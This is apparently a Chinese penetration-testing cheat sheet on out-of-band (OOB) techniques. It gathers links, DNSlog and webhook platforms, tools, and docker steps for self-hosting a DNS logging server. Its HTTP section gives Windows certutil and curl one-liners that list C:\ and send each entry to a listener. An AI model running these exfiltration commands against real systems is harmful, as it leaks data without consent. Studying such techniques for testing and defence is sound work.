# OOB

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**
- [带外通道技术（OOB）总结](https://www.freebuf.com/articles/web/201013.html)
- [OOB（out of band）分析系列之DNS渗漏](https://cloud.tencent.com/developer/article/1047283)
- [Burpsuite之BurpCollaborator模块介绍](https://www.jianshu.com/p/92b4b8ddf12f)
- [Persistent Access to Burp Suite Sessions - Step-by-Step Guide](https://www.onsecurity.io/blog/persistent-access-to-burp-suite-sessions-step-by-step-guide/)
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
- [HTTP BLIND](https://web.archive.org/web/20200224073305/https://echocipher.github.io/2019/07/22/HTTP-BLIND/)
- [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)

**在线监控平台**
- http://ceye.io/
- https://webhook.site
- http://www.dnslog.cn/
- https://iplogger.org/
- https://log.xn--9tr.com/

**相关工具**
- [uknowsec/SharpNetCheck](https://github.com/uknowsec/SharpNetCheck) - 该工具可以在 dnslog 中回显内网 ip 地址和计算机名，可实现内网中的快速定位可出网机器
- [Buzz2d0/Hyuga](https://github.com/Buzz2d0/Hyuga) - 一个用来检测带外(Out-of-Band)流量(DNS查询和HTTP请求)的监控工具
- [ztgrace/mole](https://github.com/ztgrace/mole) - 识别和利用out-of-band (OOB)漏洞的burp扩展

**平台搭建**
- [十分钟快速自建DNSlog服务器](https://mp.weixin.qq.com/s/m_UXJa0imfOi721bkBpwFg)
- [DNSLOG的快速搭建攻略](https://www.yinxiang.com/everhub/note/471fd1c4-7885-4b67-aa39-41dc36102b43)
- [安全技术|DNSLOG平台搭建从0到1](https://www.4hou.com/posts/VoJ9)

**平台**
- [BugScanTeam/DNSLog](https://github.com/BugScanTeam/DNSLog) - DNSLog 是一款监控 DNS 解析记录和 HTTP 访问记录的工具
- [lanyi1998/DNSlog-GO](https://github.com/lanyi1998/DNSlog-GO) - DNSLog-GO 是一款 golang 编写的监控 DNS 解析记录的工具，自带 WEB 界面
- [chennqqi/godnslog](https://github.com/chennqqi/godnslog)
    ```bash
    docker pull "sort/godnslog"
    docker run -p80:8080 -p53:53/udp "sort/godnslog" serve -domain yourdomain.com -4 100.100.100.100
    # yourdomain.com 替换为你的域名 100.100.100.100 替换为你的公网IP
    ```
- [yumusb/DNSLog-Platform-Golang](https://github.com/yumusb/DNSLog-Platform-Golang) - DNSLOG平台 golang 一键启动版
- [phith0n/conote-community](https://github.com/phith0n/conote-community) - Conote 综合安全测试平台社区版

---

# HTTP

**Windows**

- certutil

    使用 certutil 请求证书文件，并将下载文件重定向到 nul，无缓存、无需浏览器实现发起 http 请求
    ```bash
    for /F %x in ('dir /b c:\') do certutil -urlcache -split -f "http://127.0.0.1:8000/?result=%x" nul
    ```

- curl

    win10 等环境支持 curl
    ```bash
    for /F %x in ('dir /b c:\') do curl http://127.0.0.1:8000/%x
    ```
